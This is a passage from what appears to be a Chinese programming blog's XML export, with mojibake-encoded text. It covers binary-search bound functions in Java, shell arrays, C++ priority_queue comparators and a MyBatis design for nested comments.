&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nums[end] &lt; target) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="æŸ¥æ‰¾å¤§äºtargetå…ƒç´ çš„ä¸‹æ ‡"><a href="#æŸ¥æ‰¾å¤§äºtargetå…ƒç´ çš„ä¸‹æ ‡" class="headerlink" title="æŸ¥æ‰¾å¤§äºtargetå…ƒç´ çš„ä¸‹æ ‡"></a>æŸ¥æ‰¾å¤§äºtargetå…ƒç´ çš„ä¸‹æ ‡</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">upper_bound</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> start, <span class="keyword">int</span> end, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">        mid = (start + end) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (target &gt;= nums[mid]) &#123;</span><br><span class="line">            start = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            end = mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nums[end] &lt; target) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="æŸ¥æ‰¾ç¬¬ä¸€ä¸ªtargetå…ƒç´ çš„ä¸‹æ ‡"><a href="#æŸ¥æ‰¾ç¬¬ä¸€ä¸ªtargetå…ƒç´ çš„ä¸‹æ ‡" class="headerlink" title="æŸ¥æ‰¾ç¬¬ä¸€ä¸ªtargetå…ƒç´ çš„ä¸‹æ ‡"></a>æŸ¥æ‰¾ç¬¬ä¸€ä¸ªtargetå…ƒç´ çš„ä¸‹æ ‡</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">exist_bound</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> start, <span class="keyword">int</span> end, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">        mid = (start + end) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (target &gt; nums[mid]) &#123;</span><br><span class="line">            start = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (target &lt; nums[mid]) &#123;</span><br><span class="line">            end = mid - <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (mid - <span class="number">1</span> &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid - <span class="number">1</span>] == target) &#123;</span><br><span class="line">                end = mid - <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (end &lt; <span class="number">0</span> || nums[end] != target) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>äºŒåˆ†æŸ¥æ‰¾</tag>
      </tags>
  </entry>
  <entry>
    <title>shellä½¿ç”¨æ•°ç»„</title>
    <url>/2020/04/19/shell%E4%BD%BF%E7%94%A8%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h2 id="å®šä¹‰æ•°ç»„"><a href="#å®šä¹‰æ•°ç»„" class="headerlink" title="å®šä¹‰æ•°ç»„"></a>å®šä¹‰æ•°ç»„</h2><p>ä½¿ç”¨æ‹¬å·å®šä¹‰æ•°ç»„ï¼Œå®šä¹‰çš„æ—¶å€™å¯ä»¥ç”¨å…ƒç´ è¿›è¡Œåˆå§‹åŒ–ï¼Œä¹Ÿå¯ä»¥ç›´æ¥å®šä¹‰ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array1&#x3D;()</span><br><span class="line">array2&#x3D;(item1 item2 item3)</span><br></pre></td></tr></table></figure>
<a id="more"></a>

<h2 id="è®¿é—®æ•°ç»„ï¼š"><a href="#è®¿é—®æ•°ç»„ï¼š" class="headerlink" title="è®¿é—®æ•°ç»„ï¼š"></a>è®¿é—®æ•°ç»„ï¼š</h2><p>ä¸€èˆ¬æ ¼å¼æ˜¯ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;arrayName[index]&#125;</span></span><br></pre></td></tr></table></figure>

<p>ä¾‹å¦‚ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo $&#123;array2[1]&#125;</span><br></pre></td></tr></table></figure>

<p>æ•°ç»„çš„ä¸‹æ ‡è·ŸCè¯­è¨€ä¸€æ ·æ˜¯ä»0å¼€å§‹çš„ï¼Œæ‰€ä»¥ä¸Šé¢è¾“å‡ºçš„æ˜¯<code>item2</code></p>
<p>ä¹Ÿå¯ä»¥è®¿é—®å…¨éƒ¨å…ƒç´ ï¼Œä¸‹é¢ä¸¤ç§æ–¹æ³•æ˜¯ç­‰ä»·çš„ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo $&#123;array2[*]&#125;</span><br><span class="line">echo $&#123;array2[@]&#125;</span><br></pre></td></tr></table></figure>

<h2 id="è¿½åŠ å…ƒç´ "><a href="#è¿½åŠ å…ƒç´ " class="headerlink" title="è¿½åŠ å…ƒç´ "></a>è¿½åŠ å…ƒç´ </h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array2[50]&#x3D;&quot;abc&quot;</span><br><span class="line">array2[30]&#x3D;&quot;def&quot;</span><br></pre></td></tr></table></figure>

<p>ç„¶åè®©æˆ‘ä»¬çœ‹ä¸€ä¸‹ç°åœ¨çš„æ•°ç»„æ˜¯æ€ä¹ˆæ ·å­çš„ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">array1&#x3D;()</span><br><span class="line">array2&#x3D;(item1 item2 item3)</span><br><span class="line">array2[50]&#x3D;&quot;abc&quot;</span><br><span class="line">array2[30]&#x3D;&quot;def&quot;</span><br><span class="line">echo $&#123;array2[*]&#125;</span><br><span class="line">------------------------------</span><br><span class="line">yalexin@yalexin-PC:&#x2F;usr&#x2F;study$ .&#x2F;array.sh</span><br><span class="line">item1 item2 item3 def abc</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç°ï¼Œè¿½åŠ å…ƒç´ æ—¶å€™ä¸‹æ ‡ä¸éœ€è¦æ˜¯è¿ç»­çš„ï¼Œå½“æˆ‘ä»¬è¾“å‡ºå…¨éƒ¨å…ƒç´ çš„æ—¶å€™ï¼Œå…ƒç´ æ˜¯ç©ºå€¼çš„ä¼šè‡ªåŠ¨çœç•¥ã€‚</p>
<h2 id="è·å–é•¿åº¦ï¼š"><a href="#è·å–é•¿åº¦ï¼š" class="headerlink" title="è·å–é•¿åº¦ï¼š"></a>è·å–é•¿åº¦ï¼š</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">len&#x3D;$&#123;#array2[*]&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">len&#x3D;$&#123;#array2[@]&#125;</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥è·å–æ•°ç»„å…ƒç´ çš„é•¿åº¦ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">indexLen&#x3D;$&#123;#array2[50]&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„<code>indexLen</code>æŒ‡çš„æ˜¯å…ƒç´ çš„å­—ç¬¦ä¸ªæ•°ã€‚</p>
]]></content>
      <categories>
        <category>Linuxç›¸å…³</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>ä½¿ç”¨C++çš„ä¼˜å…ˆé˜Ÿåˆ—æ—¶è‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°</title>
    <url>/2021/04/10/%E4%BD%BF%E7%94%A8C-%E7%9A%84%E4%BC%98%E5%85%88%E9%98%9F%E5%88%97%E6%97%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E6%AF%94%E8%BE%83%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<p>åœ¨<code>C++</code>ä¸­ï¼Œä¼˜å…ˆé˜Ÿåˆ—æ˜¯ä¸€ç§åº•å±‚ä½¿ç”¨å †å®ç°çš„æ•°æ®ç»“æ„ï¼Œä½äºé˜Ÿé¦–çš„å…ƒç´ æ€»æ˜¯ç›®å‰æ‰€æœ‰å…ƒç´ ä¸­æœ€ä¼˜çš„ï¼›</p>
<a id="more"></a>

<p><strong>æ‰€åœ¨å¤´æ–‡ä»¶ï¼š</strong><code>#include &lt;queue&gt;</code></p>
<p><strong>å®šä¹‰æ–¹å¼ï¼š</strong><code>priority_queue&lt;Type, Container, Functional&gt;</code><br>è€Œ<code>C++</code>ä¹Ÿæä¾›äº†ä¸¤ç§ç®€å•çš„æ¯”è¾ƒæ–¹å¼ï¼Œå³å¤§é¡¶å †å°é¡¶å †</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å°é¡¶å †</span></span><br><span class="line">priority_queue&lt;<span class="keyword">int</span>, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;, greater&lt;<span class="keyword">int</span>&gt; &gt;greaterQue;</span><br><span class="line"><span class="comment">// å¤§é¡¶å †</span></span><br><span class="line">priority_queue&lt;<span class="keyword">int</span>, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;, less&lt;<span class="keyword">int</span>&gt; &gt;lessQue;</span><br><span class="line">greaterQue.push(<span class="number">1</span>);</span><br><span class="line">greaterQue.push(<span class="number">5</span>);</span><br><span class="line">greaterQue.push(<span class="number">2</span>);</span><br><span class="line">lessQue.push(<span class="number">1</span>);</span><br><span class="line">lessQue.push(<span class="number">5</span>);</span><br><span class="line">lessQue.push(<span class="number">2</span>);</span><br><span class="line"><span class="comment">// lessQue  = [5, 1, 2]</span></span><br><span class="line"><span class="comment">// greaterQue = [1, 5, 2]</span></span><br></pre></td></tr></table></figure>

<p>å½“æˆ‘ä»¬çš„é˜Ÿåˆ—å…ƒç´ ä¸æ˜¯æ™®é€šæ•°æ®ç±»å‹çš„æ—¶å€™ï¼Œæˆ‘ä»¬çš„æ¯”è¾ƒæ–¹å¼æœ‰å¯èƒ½å¾ˆå¤æ‚ï¼Œæˆ‘ä»¬éœ€è¦è‡ªè¡Œå®šä¹‰æ¯”è¾ƒå‡½æ•°ï¼Œä¾‹å¦‚å½“æˆ‘ä»¬éœ€è¦å¯¹ç»“æ„ä½“è¿›è¡Œç»´æŠ¤ä¼˜å…ˆé˜Ÿåˆ—çš„æ—¶å€™ï¼Œä¸€èˆ¬æœ‰ä¸¤ç§æ–¹æ³•ï¼š</p>
<ul>
<li>åœ¨ç»“æ„ä½“ä¸­é‡è½½è¿ç®—ç¬¦</li>
<li>ç»“æ„ä½“å¤–éƒ¨å®šä¹‰æ–¹æ³•ï¼Œä½¿ç”¨è¯¥æ–¹æ³•è¿›è¡Œæ„é€ é˜Ÿåˆ—</li>
</ul>
<p>ä¾‹å¦‚ï¼Œæˆ‘æœ‰ä¸€ä¸ªå­¦ç”Ÿç»“æ„ä½“ï¼Œæƒ³è¦æ„å»ºä¸€ä¸ªé˜Ÿé¦–çš„å­¦ç”Ÿæ˜¯å¹´é¾„æœ€å°çš„ï¼Œå½“å¹´é¾„éƒ½ç›¸åŒçš„æ—¶å€™ï¼Œåå­—æŒ‰ç…§å­—å…¸é¡ºåºå°çš„æ’åœ¨å‰é¢ï¼š</p>
<p><strong>æ³•ä¸€ï¼š</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stu</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="built_in">string</span> name;</span><br><span class="line">    Stu(<span class="keyword">int</span> age1, <span class="built_in">string</span> name1)&#123;</span><br><span class="line">        age = age1;</span><br><span class="line">        name = name1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span> &gt; (<span class="keyword">const</span> Stu &amp;s1) <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (s1.age == age)<span class="keyword">return</span> name &gt; s1.name;</span><br><span class="line">        <span class="keyword">return</span> age &gt; s1.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    priority_queue&lt;Stu, <span class="built_in">vector</span>&lt;Stu&gt;, greater&lt;Stu&gt; &gt;que1;</span><br><span class="line">    que1.push(Stu&#123;<span class="number">11</span>, <span class="string">"yalexin"</span>&#125;);</span><br><span class="line">    que1.push(Stu&#123;<span class="number">11</span>, <span class="string">"axin"</span>&#125;);</span><br><span class="line">    que1.push(Stu&#123;<span class="number">12</span>, <span class="string">"aaaaa"</span>&#125;);</span><br><span class="line">    que1.push(Stu&#123;<span class="number">12</span>, <span class="string">"bbbbb"</span>&#125;);</span><br><span class="line">    <span class="keyword">while</span>(!que1.empty())&#123;</span><br><span class="line">        Stu top = que1.top();</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"age ï¼š "</span> &lt;&lt; top.age &lt;&lt; <span class="string">", name : "</span> &lt;&lt; top.name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        que1.pop(); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯¹äºä¸Šé¢çš„ä»£ç ï¼Œæ§åˆ¶å°è¾“å‡ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">age ï¼š 11, name : axin</span><br><span class="line">age ï¼š 11, name : yalexin</span><br><span class="line">age ï¼š 12, name : aaaaa</span><br><span class="line">age ï¼š 12, name : bbbbb</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„å½“ä½ æ‰“ç®—ä½¿ç”¨</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">priority_queue&lt;Stu, <span class="built_in">vector</span>&lt;Stu&gt;, greater&lt;Stu&gt; &gt;que1</span><br></pre></td></tr></table></figure>

<p>çš„æ—¶å€™ï¼Œç»“æ„ä½“ä¸­éœ€è¦é‡è½½çš„è¿ç®—ç¬¦æ˜¯<code>&gt;</code>ï¼Œç›¸åº”çš„ï¼Œä½ æ‰“ç®—ä½¿ç”¨</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">priority_queue&lt;Stu, <span class="built_in">vector</span>&lt;Stu&gt;, greater&lt;Stu&gt; &gt;que1</span><br></pre></td></tr></table></figure>

<p>çš„æ—¶å€™ï¼Œä½ çš„ç»“æ„ä½“ä¸­å°±åº”è¯¥é‡è½½<code>&lt;</code></p>
<p><strong>æ³•äºŒï¼š</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stu</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="built_in">string</span> name;</span><br><span class="line">    Stu(<span class="keyword">int</span> age1, <span class="built_in">string</span> name1)&#123;</span><br><span class="line">        age = age1;</span><br><span class="line">        name = name1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MyCmp</span>&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">const</span> Stu &amp;a, <span class="keyword">const</span> Stu &amp;b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (a.age == b.age) <span class="keyword">return</span> a.name &gt; b.name;</span><br><span class="line">        <span class="keyword">return</span> a.age &gt; b.age;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    priority_queue&lt;Stu, <span class="built_in">vector</span>&lt;Stu&gt;, MyCmp &gt;que1;</span><br><span class="line">    que1.push(Stu&#123;<span class="number">11</span>, <span class="string">"yalexin"</span>&#125;);</span><br><span class="line">    que1.push(Stu&#123;<span class="number">11</span>, <span class="string">"axin"</span>&#125;);</span><br><span class="line">    que1.push(Stu&#123;<span class="number">12</span>, <span class="string">"aaaaa"</span>&#125;);</span><br><span class="line">    que1.push(Stu&#123;<span class="number">12</span>, <span class="string">"bbbbb"</span>&#125;);</span><br><span class="line">    <span class="keyword">while</span>(!que1.empty())&#123;</span><br><span class="line">        Stu top = que1.top();</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"age ï¼š "</span> &lt;&lt; top.age &lt;&lt; <span class="string">", name : "</span> &lt;&lt; top.name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        que1.pop(); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸¤ç§æ–¹æ³•çš„ç»“æœéƒ½ä¸€æ ·ã€‚</p>
]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>äºŒçº§è¯„è®ºå±•ç¤ºçš„å®ç°æ–¹æ³•</title>
    <url>/2021/03/01/%E4%BA%8C%E7%BA%A7%E8%AF%84%E8%AE%BA%E5%B1%95%E7%A4%BA%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>é€šå¸¸çš„åšå®¢è¯„è®ºå±•ç¤ºæœ‰ä¸€çº§è¯„è®ºã€äºŒçº§è¯„è®ºã€å¤šçº§è¯„è®ºï¼Œä¸åŒçš„å±•ç¤ºæ–¹æ³•ç»™ç”¨æˆ·çš„ä½“éªŒä¸ä¸€æ ·ã€‚</p>
<a id="more"></a>

<h2 id="ä¸€çº§è¯„è®º"><a href="#ä¸€çº§è¯„è®º" class="headerlink" title="ä¸€çº§è¯„è®º"></a>ä¸€çº§è¯„è®º</h2><p>é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯æ‰€æœ‰è¯„è®ºï¼ˆå›å¤ï¼‰æ˜¯åŒçº§å…³ç³»ï¼Œè¿™æ ·å­æ˜¯è®¾è®¡ç®€å•ï¼ŒæŸ¥è¯¢è¿…é€Ÿï¼Œè¡¨å¯ä»¥è®¾è®¡æˆï¼š</p>
<table>
<thead>
<tr>
<th>å­—æ®µ</th>
<th>å­—æ®µè¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>ä¸»é”®</td>
</tr>
<tr>
<td>blog_id</td>
<td>æ‰€å±åšå®¢çš„id</td>
</tr>
<tr>
<td>content</td>
<td>è¯„è®ºå†…å®¹</td>
</tr>
</tbody></table>
<p>æŸ¥è¯¢æŸä¸€ç¯‡æ–‡ç« çš„è¯„è®ºæ—¶å€™å¯ä»¥ä½¿ç”¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM t_comment WHERE blog_id &#x3D; 99;</span><br></pre></td></tr></table></figure>

<p>æ˜¯ä¸æ˜¯éå¸¸çš„ç®€å•ï¼</p>
<p>ä½†æ˜¯è¿™æ ·å­ç”¨æˆ·ä½“éªŒå°±å¤ªå·®äº†ï¼Œå¯¹äºå›å¤çš„è¯„è®ºï¼Œç”¨æˆ·æ ¹æœ¬æ— æ³•å»ºç«‹èµ·å›å¤çš„æ¡¥æ¢ã€‚</p>
<p><img src="https://qiniu.yalexin.top/%E4%B8%80%E7%BA%A7%E8%AF%84%E8%AE%BA.png" alt></p>
<h2 id="å¤šçº§è¯„è®º"><a href="#å¤šçº§è¯„è®º" class="headerlink" title="å¤šçº§è¯„è®º"></a>å¤šçº§è¯„è®º</h2><p>ç®€å•æ¥è¯´å°±æ˜¯å±‚å±‚åµŒå¥—ï¼Œæ¯ä¸€æ¡è¯„è®ºå…·æœ‰ä¸¥æ ¼çš„çˆ¶å­å…³ç³»ã€‚è¡¨æ ¼å¯ä»¥è®¾è®¡æˆï¼š</p>
<table>
<thead>
<tr>
<th>å­—æ®µ</th>
<th>å­—æ®µè¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>ä¸»é”®</td>
</tr>
<tr>
<td>blog_id</td>
<td>æ‰€å±åšå®¢çš„id</td>
</tr>
<tr>
<td>content</td>
<td>è¯„è®ºå†…å®¹</td>
</tr>
<tr>
<td>parent_comment_id</td>
<td>çˆ¶çº§è¯„è®ºidï¼Œé¡¶å±‚è¯„è®ºä¸º-1</td>
</tr>
</tbody></table>
<p><code>JavaBean</code>è®¾è®¡ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">	<span class="keyword">private</span> String content;</span><br><span class="line">    <span class="keyword">private</span> Long blogId;</span><br><span class="line">    <span class="keyword">private</span> Long parentCommentId;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Comment&gt; replyComments;</span><br><span class="line">    <span class="comment">// çœç•¥setå’Œgetæ–¹æ³•</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æŸ¥è¯¢çš„æ—¶å€™ï¼Œå¯¹äºæ¯ä¸€æ¡é¡¶å±‚è¯„è®ºï¼Œæ‹¿åˆ°é¡¶å±‚è¯„è®ºçš„<code>id</code>åï¼Œå°†è¯¥<code>id</code>ä½œä¸ºå‚æ•°ï¼Œå¯ä»¥æŸ¥å‡ºäºŒçº§è¯„è®ºï¼Œå°†äºŒçº§è¯„è®ºçš„<code>id</code>ä½œä¸ºå‚æ•°ï¼Œå¯ä»¥æŸ¥å‡ºä¸‰çº§è¯„è®ºâ€¦â€¦</p>
<p>å€ŸåŠ©<code>Mybatis</code>ï¼ŒæŸ¥è¯¢è¯­å¥å¯ä»¥å†™æˆï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">"top.yalexin.rblog.mapper.CommentMapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"findTopCommentsByParentIdAndBlogId"</span> <span class="attr">resultMap</span>=<span class="string">"topComment"</span>&gt;</span></span><br><span class="line">        select * from t_comment as cmt where cmt.parent_comment_id=#&#123;parentId&#125; and cmt.blog_id=#&#123;blogId&#125; </span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">"topComment"</span> <span class="attr">type</span>=<span class="string">"Comment"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">"id"</span> <span class="attr">property</span>=<span class="string">"id"</span>&gt;</span><span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"content"</span> <span class="attr">column</span>=<span class="string">"content"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"blogId"</span> <span class="attr">column</span>=<span class="string">"blog_id"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"parentCommentId"</span> <span class="attr">column</span>=<span class="string">"parent_comment_id"</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- è¿™ä¸€æ­¥ä½¿å¾—JDBCé€’å½’è¿›è¡ŒæŸ¥è¯¢ --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">"replyComments"</span> <span class="attr">select</span>=<span class="string">"findTopCommentsByParentIdAndBlogId"</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">column</span>=<span class="string">"&#123;blogId=blog_id,parentId=id&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">association</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>æŸ¥è¯¢ç»“æœç±»ä¼¼äºï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">	&#123;</span><br><span class="line">        id: 1,</span><br><span class="line">        content: 'hello',</span><br><span class="line">        parent_comment_id: -1,</span><br><span class="line">        replyComments: [</span><br><span class="line">            &#123;</span><br><span class="line">                id: 2,</span><br><span class="line">                content: 'hello',</span><br><span class="line">                parent_comment_id: 1,</span><br><span class="line">                replyComments:[</span><br><span class="line">                    &#123;</span><br><span class="line">                        id: 3,</span><br><span class="line">                        content: 'hello',</span><br><span class="line">                        parent_comment_id: 2,</span><br><span class="line">                        replyComments:[]</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        id: 4,</span><br><span class="line">        content: 'hello',</span><br><span class="line">        parent_comment_id: -1,</span><br><span class="line">        replyComments: []</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>ç±»ä¼¼çš„æ•ˆæœï¼š</p>
<p><img src="https://qiniu.yalexin.top/%E5%A4%9A%E7%BA%A7%E8%AF%84%E8%AE%BA.png" alt></p>
<p>è™½ç„¶çœ‹ä¸Šå»å±‚çº§å…³ç³»æ¸…æ™°æ˜äº†ï¼Œä½†æ˜¯å½“å›å¤æ ‘æ·±åº¦å¾ˆå¤§çš„æ—¶å€™ï¼Œé¡µé¢å°†å˜å¾—ååˆ†éš¾çœ‹ï¼Œæ‰€ä»¥è¯¥æ–¹å¼ä¹Ÿå¾ˆå°‘ä½¿ç”¨ã€‚</p>
<h2 id="äºŒçº§è¯„è®º"><a href="#äºŒçº§è¯„è®º" class="headerlink" title="äºŒçº§è¯„è®º"></a>äºŒçº§è¯„è®º</h2><p>è¯¥æ–¹å¼å…ˆæŠŠæ¯ä¸€ä¸ªé¡¶çº§è¯„è®ºå±•ç¤ºï¼Œç„¶åæ¯ä¸€ä¸ªé¡¶çº§è¯„è®ºä¸‹çš„æ‰€æœ‰è¯„è®ºéƒ½å¤„ç†æˆäºŒçº§è¯„è®º</p>
<p>è¯¥æ–¹å¼æŸ¥è¯¢è¿‡ç¨‹ä¹Ÿå¾ˆç®€å•ï¼Œ<strong>æŸ¥è¯¢è¯­å¥å’Œå¤šçº§è¯„è®ºçš„æ–¹å¼ä¸€æ ·</strong>ï¼Œéœ€è¦æ”¹å˜çš„æ˜¯æŸ¥è¯¢ç»“æŸåçš„å¤„ç†ï¼š</p>
<p>å¦‚æœå°†æ¯ä¸€ä¸ªé¡¶çº§è¯„è®ºå’Œè¯¥è¯„è®ºä¸‹çš„å­å­™è¯„è®ºçœ‹æˆä¸€æ£µæ ‘çš„è¯ï¼Œä¸ºæ¯ä¸€ä¸ªé¡¶çº§è¯„è®ºåˆ›å»ºä¸€ä¸ªreplyCmtså®¹å™¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€’å½’è¿›è¡Œï¼Œé‡åˆ°å¶èŠ‚ç‚¹æ—¶ï¼Œå°†å¶èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹çš„replyCommentsè®¾ä¸ºç©ºï¼ŒåŒæ—¶å°†å¶èŠ‚ç‚¹æ·»åŠ åˆ°replyCmtså®¹å™¨ä¸­ï¼Œæ­¤æ—¶å…ˆå‰çš„çˆ¶èŠ‚ç‚¹åˆå˜æˆäº†å¶èŠ‚ç‚¹ï¼Œæ­¤æ—¶å°±å¯ä»¥é€’å½’è¿”å›ï¼Œç›´è‡³å¤„ç†å®Œæ‰€æœ‰èŠ‚ç‚¹ï¼Œä¸‹é¢æ˜¯ä»£ç å®ç°ï¼š</p>
